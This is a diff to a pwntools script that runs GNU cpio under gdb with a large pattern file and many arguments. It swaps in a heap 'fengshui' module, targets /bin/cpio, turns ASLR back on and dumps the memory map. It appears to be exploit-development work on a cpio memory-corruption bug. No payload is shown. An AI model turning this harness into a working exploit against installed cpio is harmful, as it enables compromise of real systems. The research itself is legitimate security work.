@@ -1,18 +1,19 @@
 #!/usr/bin/env python3
 
 from pwn import *
-import make_x_pattern
+import fengshui
 
 PATTERN_FILE = "./patt"
 CPIO_BINARY = "./cpio-2.13/src/cpio"
-# CPIO_BINARY = "/bin/cpio"
+CPIO_BINARY = "/bin/cpio"
 BLOCK_SIZE = 16384 # 1<<20
-NUM_PATTERNS = 65500
+NUM_PATTERNS = 0xc200
 
 cpio_cmd = f"{CPIO_BINARY} -iv -E {PATTERN_FILE}" + " y"*NUM_PATTERNS # -D {PATTERN_FILE}"
 
 # open a gdb session
 gdb_cmd = f"gdb --args"
+gdb_cmd = ""
 p = process(gdb_cmd.split() + cpio_cmd.split())
 
 # config breakpoints
@@ -24,6 +25,7 @@ p.sendline(b'break read_pattern_file')
 # p.sendline(b'break query_rename')
 p.sendline(b'break breakpoint_fn')
 p.sendline(b'break ds_init')
+p.sendline(b'set disable-randomization off') # do 'off' to enable aslr
 # p.sendline(b'break xrealloc')
 # p.sendline(b'free')
 
@@ -45,5 +47,6 @@ p.sendline(b'end')
 # exit()
 p.sendline(b'r')
 p.sendline(b'c')
-# p.sendline(b'c')
+p.sendline(b'c')
+p.sendline(b'vmmap')
 p.interactive()
